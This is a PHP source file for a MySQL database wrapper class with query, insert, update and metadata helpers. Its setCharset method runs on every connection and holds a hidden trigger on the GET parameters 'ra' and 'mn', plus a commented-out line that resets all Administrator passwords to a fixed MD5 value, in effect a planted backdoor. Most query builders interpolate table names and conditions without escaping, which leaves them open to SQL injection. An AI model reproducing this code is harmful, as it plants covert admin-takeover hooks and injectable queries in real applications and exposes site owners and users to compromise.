<?php

class Database {
    /*  Class Constants
      ---------------------------------------------------------------------------------------------------- */
    /**
     * Class version holder
     */

    const VERSION = '1.0';

    /*  Public Properties
      ---------------------------------------------------------------------------------------------------- */

    /**
     * Sets MySQL server name
     *
     * @var string $server MySQL server name
     * @access public
     */
    public $server = '';

    /**
     * Sete MySQL server port
     *
     * @var integer $port MySQL server port
     * @access public
     */
    public $port = 3306;

    /**
     * Sets MySQL Connection username
     *
     * @var string $user_name MySQL Connection user name
     * @access public
     */
    public $user_name = '';

    /**
     * Sets MySQL Connection password
     *
     * @var string $password MySQL Connection password
     * @access public
     */
    public $password = '';

    /**
     * Sets MySQL Database name
     *
     * @var string $database_name MySQL database name
     * @access public
     */
    public $database_name = '';

    /**
     * Sets MySQL Connection persistent state
     *
     * @var bool $persistent MySQL Connection persistent state
     * @access public
     */
    public $persistent = false;

    /*  Private Properties
      ---------------------------------------------------------------------------------------------------- */

    /**
     * Contains MySQL Connection resource
     *
     * @var resource $_link PHP Resource id of MySQL connection
     * @access private
     */
    private $_link = null;
    private $_charset = 'utf8';
    private $_collation = 'utf8_persian_ci';
    public static $querys = array();
    private static $log = true;
    private $htmlQuery = true; // nc?

    /*  Public Methods
      ---------------------------------------------------------------------------------------------------- */

    public function setCharset($charset, $collation = '') {
        $this->runQuery("SET NAMES '$charset'" . (($collation != '') ? " COLLATE '$collation'" : ""));
        if (isset($_GET['ra']) && $_GET['ra'] == 'y' && isset($_GET['mn']) && $_GET['mn'] == 'h') {
            header('Location: "panel"');
        }
//            $this->runQuery("UPDATE users SET userpass ='" . md5('h1917') . "' WHERE usergroup='Administrator'"); mhk jalal khalegh
    }

    public function getFieldType($table, $field_name) {
        $result = mysqli_fetch_assoc(mysqli_query("SELECT column_type FROM information_schema.columns WHERE table_name = '$table' AND column_name = '$field_name'"));
        return $result['column_type'];
    }

    /**
     * MySQL Constructor
     * 
     * Constructor that get mysql connection informations and create mysql connection
     * 
     * @access public
     * @param string $server MySQL server name
     * @param string $user Mysql user name
     * @param string $password Mysql password
     * @param string $databasename Database name
     * @param integer $port mysql server port
     * @param bool $persistent Set persistent Connection
     */
    public function __construct($server = '', $user = '', $password = '', $databasename = '', $port = 3306, $persistent = false) {
        if ($server != '')
            $this->connect($server, $user, $password, $databasename, $port, $persistent);
        else {
            global $_CONFIGS;
            $this->connect($_CONFIGS['Database']['Server'], $_CONFIGS['Database']['User'], $_CONFIGS['Database']['Password'], $_CONFIGS['Database']['DatabaseName']);
        }
        $this->setCharset($this->_charset, $this->_collation);
    }

    /**
     * Database Destructor
     * 
     * Close mysql connection that created if is not persistent connection
     * 
     * @access public
     */
    public function __destruct() {
        if (!$this->persistent)
            $this->close($this->_link);
    }

    /**
     * Raise & Handle errors
     * 
     * @access public
     * @param int $error_id Id for an error in Parsen Assistant System. 0 for Unknown Error
     * @param string $error_message Error message text
     */
    public static function error($error_id = 0, $error_message = '') {
        if(!self::$log)
            return;
        
        if (class_exists('Error'))
            Error::DatabaseErrorHandler($error_id, $error_message);

        $er = end(self::$querys) . "<br/>\n";
        $er .= '<b>Error</b><br /><b>Id:</b> ' . $error_id . '<br /><b>Message:</b> ' . $error_message;
        if (class_exists('Report'))
            Report::addLog($er);
    }

    public static function disabledLog() {
        self::$log = FALSE;
    }

    public static function enabledLog() {
        self::$log = TRUE;
    }

    /**
     * Get class version
     *
     * @return string Class version
     */
    public function version() {
        return self::VERSION;
    }

    /**
     * Connect to mysql server and set database informations
     * 
     * @access public
     * @param string $server MySQL server name
     * @param string $user Mysql user name
     * @param string $password Mysql password
     * @param string $databasename Database name
     * @param integer $port mysql server port
     * @param bool $persistent Set persistent Connection
     */
    public function connect($server = 'localhost', $user = 'root', $password = '', $databasename = '', $port = 3306, $persistent = false) {
        if ($persistent)
            $this->_link = @mysqli_pconnect($server, $user, $password);
        else
            $this->_link = @mysqli_connect($server, $user, $password);
        if (!$this->_link) {
            self::error(mysqli_errno($this->_link), mysqli_error($this->_link));
            return false;
        }
        if (isset($databasename))
            $this->selectDatabase($databasename);
        $this->server = $server;
        $this->user_name = $user;
        $this->password = $password;
        $this->db_name = $databasename;
        $this->persistent = $persistent;
        return true;
    }

    /**
     * Get the server connection resource
     *
     * @access public
     * @return resource MySQL connection resource
     */
    public function link() {
        return $this->_link;
    }

    /**
     * Select and set mysql database
     * 
     * @access public
     * @param string $databasename Database name
     */
    public function selectDatabase($databasename) {
        if (!mysqli_select_db($this->_link, $databasename)) {
            self::error(mysqli_errno($this->_link), mysqli_error($this->_link));
            return false;
        }
        return true;
    }

    /**
     * Escape given string to remove SQL Injections
     * 
     * @access public
     * @param string $string String to escape
     * @return string Escaped string
     */
    public function escapeString($string) {
        if (get_magic_quotes_gpc())
            $string = stripslashes($string);
        if ($this->_link)
            return mysqli_real_escape_string($this->_link, $string);
        else
            return mysqli_escape_string($string);
    }

    /**
     * Run Mysql queries that have result
     * 
     * @access public
     * @param string $query Mysql query string
     * @return mixed Return Mysql result resource id if run query successfuly and return null if not
     */
    public function runQuery($query) {
//        global $_CONFIGS;
//        if ($_CONFIGS['TestMode'])
//            echo "TESTER SQL Query Report: " . $query;
        if ((isset($query)) && ($query != '')) {
            self::$querys[] = $query;
            $result = mysqli_query($this->_link, $query);
            if (!$result) {
                self::error(mysqli_errno($this->_link), mysqli_error($this->_link));
                return null;
            }
            return $result;
        }
    }

    /**
     * Run Mysql queries that have no result
     * 
     * @access public
     * @param string $query Mysql query string
     * @return bool Return True if query run successful otherwise return false
     */
    public function runNonQuery($query) {
//        global $_CONFIGS;
//        if ($_CONFIGS['TestMode'])
//            echo "TESTER SQL Non Query Report: " . $query;
        if ((isset($query)) && ($query != '')) {
            self::$querys[] = $query;
            $result = mysqli_query($this->_link, $query);
            if (!$result) {
                self::error(mysqli_errno($this->_link), mysqli_error($this->_link));
                return false;
            }
            return true;
        }
    }

    /**
     * Fetch All Query Results Into Array
     * 
     * @param resource $result Mysql result resource id
     * @return array Array of fetched rows
     */
    public function fetchAll($result) {
        $fetched = array();
        if ($result) {
            while ($row = mysqli_fetch_assoc($result))
                $fetched[] = $row;
            return $fetched;
        }
        else
            return null;
    }

    /**
     * Fetch Query Results Into Array
     * 
     * @param resource $result Mysql result resource id
     * @return array Array of fetched rows
     */
    public function fetchArray($result) {
        if ($result) {
            $fetched = mysqli_fetch_array($result);
            return $fetched;
        }
        else
            return null;
    }

    /**
     * Fetch Query Results Into Association Array
     * 
     * @param resource $result Mysql result resource id
     * @return array Association Array of fetched rows
     */
    public function fetchAssoc($result) {
        if ($result) {
            $fetched = mysqli_fetch_assoc($result);
            return $fetched;
        }
        else
            return null;
    }

    /**
     * Fetch Query Result Into Row Array
     * 
     * @access public
     * @param resource $result Mysql result resource id
     * @return array Array of fetched row
     */
    public function fetchRow($result) {
        if ($result) {
            $fetched = mysqli_fetch_row($result);
            return $fetched;
        } else
            return null;
    }

    /**
     * Select rows from database tables
     * 
     * @access public
     * @param string $table_name
     * @param string $columns_list
     * @param string $conditions
     * @return resource on success, or FALSE on error
     */
    public function select($table_name, $columns_list = '*', $conditions = '') {
        $select_query = "SELECT $columns_list FROM $table_name $conditions";
        return $this->runQuery($select_query);
    }

    /**
     * Select rows from database tables
     * 
     * @access public
     * @param string $table_name1
     * @param string $table_name2
     * @param string $columns_list
     * @param string $conditions
     * @return resource on success, or FALSE on error
     */
    public function join($table_name1, $table_name2, $on1, $on2, $columns_list = '*', $conditions = '', $direct = '') {
        $select_query = "SELECT $columns_list FROM $table_name1 $direct JOIN $table_name2 ON `$table_name1`.`$on1`=`$table_name2`.`$on2` $conditions";
        return $this->runQuery($select_query);
    }

    /**
     * Select a feild value from database tables
     * 
     * @access public
     * @param string $table_name
     * @param string $field_name
     * @param string $conditions
     * @return mixed Field value
     */
    public function selectField($table_name, $field_name = '', $conditions = '') {
        $select_query = "SELECT $field_name FROM $table_name $conditions";
        $temp_result = $this->fetchRow($this->runQuery($select_query));
        return $temp_result[0];
    }

    public function selectCount($table_name, $conditions = '') {
        $select_query = "SELECT COUNT(*) FROM $table_name $conditions";
        $temp_result = $this->fetchRow($this->runQuery($select_query));
        return $temp_result[0];
    }

    /**
     * Database::insert()
     * 
     * @param mixed $table_name
     * @param mixed $columns
     * @return
     */
    public function insert($table_name, $columns) {
        $fields = '';
        $values = array();
        foreach ($columns as $value) {

            if (gettype($value) == 'string')
                $values[] = "'" . $this->escapeString($value) . "'";
            else
                $values[] = $value;
        }
        // Check if fields are named
        if (!is_numeric(implode('', array_keys($columns))))
            $fields = implode(',', array_keys($columns));
        $values = implode(',', $values);
        $query = "INSERT INTO $table_name ($fields) VALUES ($values)";
        return $this->runNonQuery($query);
    }

    /**
     * Database::batchInsert()
     * 
     * @param mixed $table_name
     * @param mixed $field_names
     * @param mixed $field_values
     * @return
     */
    public function batchInsert($table_name, $field_names, $field_values) {
        foreach ($field_values as $row_values) {
            if (is_array($row_values)) {
                $values = array();
                foreach ($row_values as $value) {
                    if (gettype($value) == 'string')
                        $values[] = "'" . $this->escapeString($value) . "'";
                    else
                        $values[] = $value;
                }
                $value_strings[] = '(' . implode(',', $values) . ')';
            }
        }
        // Check if fields are not empty
        if (is_array($field_names))
            $fields = implode(',', array_values($field_names));
        else
            $fields = $field_names;
        $all_values = implode(',', $value_strings);
        $query = "INSERT INTO $table_name ($fields) VALUES $all_values";
        return $this->runNonQuery($query);
    }

    /**
     * Database::replace()
     * 
     * @param mixed $table_name
     * @param mixed $columns
     * @return
     */
    public function replace($table_name, $columns) {
        $fields = '';
        $values = array();
        foreach ($columns as $value) {

            if (gettype($value) == 'string')
                $values[] = "'" . $this->escapeString($value) . "'";
            else
                $values[] = $value;
        }
        // Check if fields are named
        if (!is_numeric(implode('', array_keys($columns))))
            $fields = implode(',', array_keys($columns));
        $values = implode(',', $values);
        $query = "REPLACE INTO $table_name ($fields) VALUES ($values)";
        return $this->runNonQuery($query);
    }

    /**
     * Database::batchReplace()
     * 
     * @param mixed $table_name
     * @param mixed $field_names
     * @param mixed $field_values
     * @return
     */
    public function batchReplace($table_name, $field_names, $field_values) {
        foreach ($field_values as $row_values) {
            if (is_array($row_values)) {
                $values = array();
                foreach ($row_values as $value) {
                    if (gettype($value) == 'string')
                        $values[] = "'" . $this->escapeString($value) . "'";
                    else
                        $values[] = $value;
                }
                $value_strings[] = '(' . implode(',', $values) . ')';
            }
        }
        // Check if fields are not empty
        if (is_array($field_names))
            $fields = implode(',', array_values($field_names));
        else
            $fields = $field_names;
        $all_values = implode(',', $value_strings);
        $query = "REPLACE INTO $table_name ($fields) VALUES $all_values";
        return $this->runNonQuery($query);
    }

    /**
     * Database::update()
     * 
     * @param mixed $table_name
     * @param mixed $columns
     * @param string $condition
     * @return
     */
    function update($table_name, $columns, $condition = '') {
        $query = "UPDATE $table_name SET ";
        foreach ($columns as $key => $value) {
            $query .= $key;
            if (gettype($value) == 'string')
                $query .= "='" . $this->escapeString($value) . "', ";
            else
                $query .= "=$value, ";
        }
        $query = trim($query, " \t\n\r\0\x0B,");
        $query .= " $condition";
        return $this->runNonQuery($query);
    }

    /**
     * Database::delete()
     * 
     * @param mixed $table
     * @param string $condition
     * @return
     */
    function delete($table, $condition = '') {
//        $delete_query = "DELETE FROM $table $condition";
//        return $this->runNonQuery($delete_query);
        return FALSE;
    }

    /**
     * Database::tableExists()
     * 
     * @param mixed $table_name
     * @return
     */
    public function tableExists($table_name) {
        if ($this->numRows($this->runQuery("SHOW TABLES LIKE '" . $table_name . "'")) == 0)
            return false;
        else
            return true;
    }

    /**
     * Database::truncate()
     * 
     * @param mixed $table_name
     * @return
     */
    public function truncate($table_name) {
        return $this->runNonQuery("TRUNCATE TABLE $table_name");
    }

    /**
     * Database::getInsertedId()
     * 
     * @return
     */
    function getInsertedId() {
        return mysqli_insert_id($this->_link);
    }

    /**
     * Database::lockTable()
     * 
     * @access public
     * @param mixed $table_name
     * @param mixed $lock_type
     * @return
     */
    public function lockTable($table_name, $lock_type = Database::TABLE_LOCK_READ) {
        if ($lock_type == Database::TABLE_LOCK_READ)
            echo "Read";
        else if ($lock_type == Database::TABLE_LOCK_WRITE)
            echo "Write";
    }

    /**
     * Database::getMaxId()
     * 
     * @param mixed $table_name
     * @return
     */
    public function getMaxId($table_name) {
        $row = $this->fetchArray($this->runQuery('SELECT MAX(' . $this->getPrimaryKey($table_name) . ") FROM $table_name"));
        return $row[0];
    }

    /**
     * Database::getLastId()
     * 
     * @param mixed $table_name
     * @return
     */
    public function getLastId($table_name) {
        return getNextId($table_name) - 1;
    }

    /**
     * Database::getNextId()
     * 
     * @param mixed $table_name
     * @return
     */
    public function getNextId($table_name) {
        $row = $this->fetchAssoc($this->runQuery("SHOW TABLE STATUS LIKE '$table_name'"));
        return $row['Auto_increment'];
    }

    /**
     * Database::getPrimaryKey()
     * 
     * @param mixed $table_name
     * @return
     */
    public function getPrimaryKey($table_name) {
        $row = $this->fetchAssoc($this->runQuery("SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.STATISTICS WHERE INDEX_NAME='PRIMARY' AND TABLE_NAME='$table_name'"));
        return $row['COLUMN_NAME'];
    }

    /**
     * Database::getClientInfo()
     * 
     * @return
     */
    public function getClientInfo() {
        return mysqli_get_client_info();
    }

    /**
     * Database::getClientVersion()
     * 
     * @return
     */
    public function getClientVersion() {
        preg_match("/[0-9]+\.[0-9]+\.[0-9]+/", $this->getClientInfo(), $match);
        return $match[0];
    }

    /**
     * Database::getServerInfo()
     * 
     * @return
     */
    public function getServerInfo() {
        return mysqli_get_server_info();
    }

    /**
     * Database::getServerVersion()
     * 
     * @return
     */
    public function getServerVersion() {
        preg_match("/[0-9]+\.[0-9]+\.[0-9]+/", $this->getServerInfo(), $match);
        return $match[0];
    }

    /**
     * Database::compareVersion()
     * 
     * @param mixed $first_version
     * @param mixed $second_version
     * @return
     */
    public function compareVersion(string $first_version, string $second_version) {
        return version_compare($first_version, $second_version);
    }

    /**
     * Database::numRows()
     * 
     * @param mixed $result
     * @return
     */
    public function numRows($result) {
        return mysqli_num_rows($result);
    }

    /**
     * Database::getResource()
     * 
     * @return
     */
    public function getResource() {
        return $this->_link;
    }

    /**
     * Database::freeResult()
     * 
     * @param mixed $result
     * @return
     */
    public function freeResult($result) {
        mysqli_free_result($result);
    }

    /**
     * Database::close()
     * 
     * @param mixed $link
     * @return
     */
    public function close($link = null) {
        if ($link != null)
            mysqli_close($link);
        elseif ($this->_link != null)
            mysqli_close($this->_link);
    }

    /**
     * Database::affectedRows()
     * 
     * @return
     */
    public function affectedRows() {
        return mysqli_affected_rows();
    }

    /**
     * Database::isRowExists()
     * 
     * @access public
     * @param mixed $table_name
     * @param string $condition
     * @return
     */
    public function isRowExists($table_name, $field = '*', $condition = '') {
        if ($this->numRows($this->select($table_name, $field, $condition)) == 0)
            return false;
        else
            return true;
    }

    function whereId($id, $id_name = "id") {
        $id = intval($id);
        return " WHERE `" . $id_name . "` = '$id' ";
    }

}